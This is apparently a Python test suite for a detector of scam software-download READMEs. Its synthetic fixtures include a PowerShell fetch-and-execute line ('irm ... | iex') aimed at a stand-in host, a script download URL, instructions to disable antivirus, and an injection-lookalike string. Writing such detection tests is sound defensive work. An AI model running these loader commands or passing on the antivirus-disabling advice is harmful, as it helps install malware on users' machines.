"""Self-test for scam-readme-fingerprint: functional / error-path / extreme-edge.

All fixtures are synthetic, written for this test. No real malicious content
is reproduced; no network is used anywhere.
"""
from __future__ import annotations

import os
import sys
import tempfile

from fingerprint import (AV_SUPPRESSION_PATTERNS, LOADER_PATTERNS, SIGNATURE_HOSTS,
                         format_report, scan_paths, scan_text)

_results = []


def record(family: str, name: str, ok: bool, detail: str = "") -> None:
    _results.append((family, name, "PASS" if ok else "FAIL", detail))


MAL = """# Tool PRO free download 2026 crack full version

irm https://x.test/Loader.ps1 | iex

### How to download Tool PRO free?
### What is the best free Tool PRO 2026?

Temporarily disable your antivirus real-time protection and add an exclusion.
"""

BENIGN = """# pngqtool

A lossless PNG quantizer CLI. Install with pip, run `pngqtool compress a.png`.
No network requests at runtime.
"""


# ---------------------------------------------------------------- functional


def t_functional():
    r = scan_text(MAL)
    record("functional", "full three-family sample -> CRITICAL", r["verdict"] == "CRITICAL")
    record("functional", "loader family A detects irm|iex chain",
           any("Invoke-Expression" in h["rule"] or "irm" in h["rule"] for h in r["family_A_loader_ioc"]))
    record("functional", "family B detects AV suppression", len(r["family_B_av_suppression"]) >= 1)
    record("functional", "family C detects SEO stuffing", r["family_C_seo_stuffing"]["hit"])

    r = scan_text(BENIGN)
    record("functional", "benign text -> CLEAN", r["verdict"] == "CLEAN")

    r = scan_text("Get it from https://cdn.test/install.bat and run it")
    record("functional", "direct script URL flagged", any("script-file URL" in h["rule"] for h in r["family_A_loader_ioc"]))

    r = scan_text("See docs at ps-ps.cc")  # static IOC host string
    record("functional", "signature host string flagged (static)", any("signature host" in h["rule"] for h in r["family_A_loader_ioc"]))

    r = scan_text("If Defender may flag this tool, ignore the warning")
    record("functional", "'AV may flag' reframing detected", len(r["family_B_av_suppression"]) >= 1)

    only_seo = "# App free download 2026\n" + "\n".join(
        "### What is %s free download %d?" % ("App", 2024 + i % 3) for i in range(10))
    r = scan_text(only_seo)
    record("functional", "SEO-only sample -> MEDIUM (no loader)", r["verdict"] == "MEDIUM")

    av_only = "Please turn off Windows Defender before installing."
    r = scan_text(av_only)
    record("functional", "AV-instruction-only -> HIGH", r["verdict"] == "HIGH")


# ---------------------------------------------------------------- error paths


def t_error_paths():
    rep = scan_paths(["/definitely/missing/path.md"])
    record("error", "missing path -> NOT_FOUND verdict, no crash",
           rep["results"][0]["verdict"] == "NOT_FOUND")

    # unreadable bytes: latin-1 junk in a temp file
    with tempfile.NamedTemporaryFile(suffix=".md", delete=False, mode="wb") as f:
        f.write(b"\xff\xfe\x00bad\xff utf8")
        tmp = f.name
    try:
        r = scan_file_safe(tmp)
        record("error", "corrupt/undecodable bytes handled with errors=replace", r["verdict"] in ("CLEAN", "MEDIUM"))
    finally:
        os.unlink(tmp)

    r = scan_text("irm iex curl bash without any real command")
    record("error", "bare tool names (no chain) not flagged as loader", r["verdict"] != "CRITICAL")

    rep = scan_paths([])
    record("error", "empty path list -> 0 scanned, CLEAN", rep["scanned"] == 0 and rep["overall"] == "CLEAN")

    r = scan_text("")
    record("error", "empty text -> CLEAN", r["verdict"] == "CLEAN")


def scan_file_safe(path):
    from fingerprint import scan_file
    return scan_file(path)


# ---------------------------------------------------------------- extreme edges


def t_extreme_edges():
    r = scan_text("irm https://x.test/Loader.ps1 | iex\n" * 1 + "x" * 200000)
    record("edge", "200KB padding scanned, loader still found", r["verdict"] == "CRITICAL")

    many_qa = "\n".join("### What is tool free download 2026? v%d" % i for i in range(2000))
    r = scan_text(many_qa)
    record("edge", "2000 QA headers -> high stuffing score, no crash", r["family_C_seo_stuffing"]["stuffing_score"] >= 2000)

    sqli = "irm '; DROP TABLE users; -- | iex"
    r = scan_text(sqli)
    record("edge", "injection-lookalike text treated as inert string", isinstance(r["verdict"], str))

    import time
    t0 = time.time()
    r = scan_text(("### Best free tool 2026 download? " + "kw " * 50 + "\n") * 500)
    dt = time.time() - t0
    record("edge", "500-section doc scanned <2 s", dt < 2.0, "%.2fs [measured]" % dt)

    uni = "# \u5de5\u5177 \u514d\u8d39\u4e0b\u8f7d 2026\nirm https://x.test/L.ps1 | iex \U0001f600"
    r = scan_text(uni)
    record("edge", "unicode/emoji text scanned", r["verdict"] == "CRITICAL")

    rep = format_report({"tool": "t", "scanned": 1, "flagged": 1, "overall": "CRITICAL",
                         "verdicts": {"x": "CRITICAL"},
                         "results": [{"path": "x", "verdict": "CRITICAL",
                                      "family_A_loader_ioc": [{"rule": "r", "match": "m"}],
                                      "family_B_av_suppression": [],
                                      "family_C_seo_stuffing": {"hit": True, "stuffing_score": 9,
                                                                "threshold": 6, "qa_header_count": 3,
                                                                "keyword_hits": ["free"]}}]})
    record("edge", "report formatter handles minimal dict", "CRITICAL" in rep)


def main() -> int:
    t_functional()
    t_error_paths()
    t_extreme_edges()
    fails = [r for r in _results if r[2] == "FAIL"]
    for fam, name, status, detail in _results:
        print("[%s] %-9s %s%s" % (status, fam, name, (" | " + detail) if detail else ""))
    print("\n%d checks, %d failed" % (len(_results), len(fails)))
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
